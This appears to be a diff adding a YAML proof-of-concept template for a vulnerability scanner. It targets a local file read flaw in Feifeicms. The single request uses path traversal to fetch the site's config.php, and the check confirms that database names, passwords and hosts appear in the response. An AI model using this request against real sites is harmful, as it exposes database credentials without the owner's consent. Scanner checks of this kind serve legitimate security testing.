@@ -1,0 +1,22 @@
+id: poc-yaml-feifeicms-lfr
+info:
+  name: Feifeicms 本地文件读取漏洞
+  severity: medium
+  tags:
+  - 文件读取
+  finger: Feifeicms
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /index.php?s=Admin-Data-down&id=../../Conf/config.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<?php") && contains(body, "db_name")
+    && contains(body, "db_pwd") && contains(body, "db_host")
+  output: []
